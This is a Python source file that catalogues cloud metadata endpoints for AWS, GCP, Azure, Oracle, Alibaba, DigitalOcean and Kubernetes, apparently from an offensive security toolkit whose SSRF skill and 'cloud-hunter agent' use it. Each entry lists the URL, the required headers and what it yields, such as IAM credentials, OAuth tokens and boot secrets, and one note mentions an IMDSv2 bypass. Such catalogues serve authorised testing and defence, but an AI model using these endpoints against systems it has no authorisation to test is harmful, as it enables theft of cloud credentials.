"""Cloud metadata endpoint catalogue.

One place listing every metadata endpoint worth hitting when an SSRF
is confirmed. Used by the ssrf skill and the cloud-hunter agent.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any


@dataclass
class MetadataEndpoint:
    provider: str
    url: str
    method: str = "GET"
    headers: dict[str, str] | None = None
    yields: str = ""
    notes: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "provider": self.provider,
            "url": self.url,
            "method": self.method,
            "headers": self.headers or {},
            "yields": self.yields,
            "notes": self.notes,
        }


METADATA_ENDPOINTS: tuple[MetadataEndpoint, ...] = (
    MetadataEndpoint(
        provider="aws",
        url="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        yields="IAM role name (v1)",
        notes="IMDSv1 — often blocked. Redirect chains sometimes bypass IMDSv2.",
    ),
    MetadataEndpoint(
        provider="aws",
        url="http://169.254.169.254/latest/api/token",
        method="PUT",
        headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
        yields="IMDSv2 session token",
    ),
    MetadataEndpoint(
        provider="aws",
        url="http://169.254.169.254/latest/user-data",
        yields="EC2 user-data (often contains boot secrets)",
    ),
    MetadataEndpoint(
        provider="gcp",
        url="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        headers={"Metadata-Flavor": "Google"},
        yields="Service account OAuth2 token",
    ),
    MetadataEndpoint(
        provider="gcp",
        url="http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true",
        headers={"Metadata-Flavor": "Google"},
        yields="Instance attributes (startup scripts, env)",
    ),
    MetadataEndpoint(
        provider="azure",
        url="http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        headers={"Metadata": "true"},
        yields="Managed identity token (ARM)",
    ),
    MetadataEndpoint(
        provider="azure",
        url="http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        headers={"Metadata": "true"},
        yields="Instance compute metadata",
    ),
    MetadataEndpoint(
        provider="digitalocean",
        url="http://169.254.169.254/metadata/v1/",
        yields="Droplet metadata root",
    ),
    MetadataEndpoint(
        provider="alibaba",
        url="http://100.100.100.200/latest/meta-data/",
        yields="Alibaba ECS metadata",
    ),
    MetadataEndpoint(
        provider="oracle",
        url="http://169.254.169.254/opc/v1/instance/",
        headers={"Authorization": "Bearer Oracle"},
        yields="OCI instance metadata",
    ),
    MetadataEndpoint(
        provider="kubernetes",
        url="https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
        yields="Namespace secret list (if SA token is mounted)",
    ),
)
